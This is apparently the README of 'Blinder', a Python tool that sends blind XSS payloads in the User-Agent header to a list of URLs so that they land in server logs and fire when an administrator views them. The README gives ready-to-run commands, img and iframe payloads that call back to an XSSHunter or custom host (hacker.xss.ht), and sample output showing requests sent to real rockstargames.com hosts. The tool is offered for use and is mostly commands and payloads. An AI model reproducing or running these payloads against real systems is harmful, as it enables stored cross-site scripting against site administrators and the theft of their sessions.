# Blinder
- A Tool Written In Python3 To Send Blind Payloads On The Request Headers Maybe Stored On The Logs

## Description
- That's a New Version Of Blinder You Can Use To Automate Sending Payloads Into URLs With a Fast Way. It Basicly Uses The Payload You Provide To Send It On The Value Of The *User-Agent* Header To Inject The Payload Into The Server Logs If The Admin Can View It. In This Case You Should Receive An Alert On Your XSSHunter/Bin. That's Just It.

### Installation
```
git clone https://github.com/DEMON1A/Blinder
cd Blinder
python3 Blinder.py [ARGS]
```

### What's New?
- Threading To Improve The Script Speed.
- Using Your Own External Bin Instead Of Just Using XSSHunter
- Using Your Own Payloads That Could Be Used To Inject Other Payloads For Other Issues
- Been Able To Allow/Disallow Redirects With Requests
- You Can Use Multi Payloads With The Requests And Select The Split Char
- Cleaner Code!

### How To Use:
- For Basic Usage With a Basic Payload You Can Just The Script Using This:

```
python3 Blinder.py -f URLs.txt -u hacker -r allow
```

- The Script Can't Run Without Getting The Redirection Rule. You Can Select Between `allow` and `deny` That Chooses If The Redirections Will Be Followed In This Case Or Not.

- To Add Your Own Payload You Have To Use `XXX` On Your Payload So It Could Be Replaced With The XSSHunter/ExternalBin. For Example If You Want To Create Your Own Payload It Will Look Like This:

```
python3 Blinder.py -f URLs.txt -u hacker -r allow -p '"><img src="XXX">'
```

- Make Sure The `XXX` In This Case Are Able In a Upper Case.

- To Use Your Own ExternalBin Instead Of XSSHunter You Have To Use `-b` Option. With Your External Host Including The Protocol. For Example

```
python3 Blinder.py -f URLs.txt -b https://www.example.com/ -r allow -p '"><img src="XXX">'
```

- If You Didn't Add a Payload In Any Cases, Blinder Will Auto Set The Default XSSHunter XSS Payload To Use It.

- You Can Use Multi Payloads With The Requests By Adding a Split Char Between Them You Can Select. If You Didn't Add The Split Char The Program Will Auto Set It Into `,` In This Case. To Use Multi Payloads It Will Look Like This

```
python3 Blinder.py -f URLs.txt -u hacker -r allow -p '"><img src="XXX">','"><iframe src="XXX">' -s ,
```
- The Output Will Be Something Like That In This Case.

```
Request Has Been Sent To: https://scapi.rockstargames.com, Status-Code: 403 , Payload: "><img src="https://hacker.xss.ht/">
Request Has Been Sent To: https://scapi.rockstargames.com, Status-Code: 403 , Payload: "><iframe src="https://hacker.xss.ht/">
Request Has Been Sent To: http://scapi.rockstargames.com, Status-Code: 301 , Payload: "><img src="https://hacker.xss.ht/">
Request Has Been Sent To: http://scapi.rockstargames.com, Status-Code: 301 , Payload: "><iframe src="https://hacker.xss.ht/">
Request Has Been Sent To: https://prod.p01ewr.pod.rockstargames.com, Status-Code: 200 , Payload: "><img src="https://hacker.xss.ht/">
Request Has Been Sent To: https://prod.p01ewr.pod.rockstargames.com, Status-Code: 200 , Payload: "><iframe src="https://hacker.xss.ht/">
Request Has Been Sent To: https://prod.p02sjc.pod.rockstargames.com, Status-Code: 200 , Payload: "><img src="https://hacker.xss.ht/">
Request Has Been Sent To: https://prod.p02sjc.pod.rockstargames.com, Status-Code: 200 , Payload: "><iframe src="https://hacker.xss.ht/">
Request Has Been Sent To: https://prod.p02ewr.pod.rockstargames.com, Status-Code: 200 , Payload: "><img src="https://hacker.xss.ht/">
Request Has Been Sent To: https://prod.p02ewr.pod.rockstargames.com, Status-Code: 200 , Payload: "><iframe src="https://hacker.xss.ht/">
Request Has Been Sent To: https://warehouse.rockstargames.com, Status-Code: 302 , Payload: "><img src="https://hacker.xss.ht/">
Request Has Been Sent To: https://warehouse.rockstargames.com, Status-Code: 302 , Payload: "><iframe src="https://hacker.xss.ht/">
Request Has Been Sent To: https://prod.p01sjc.pod.rockstargames.com, Status-Code: 200 , Payload: "><img src="https://hacker.xss.ht/">
Request Has Been Sent To: https://prod.p01sjc.pod.rockstargames.com, Status-Code: 200 , Payload: "><iframe src="https://hacker.xss.ht/">
```

### Something Isn't Working Or You Want To Improve Something?
- Then Please Open an Issue With It Or You Can Fork The Project Then Create a Pull Request.
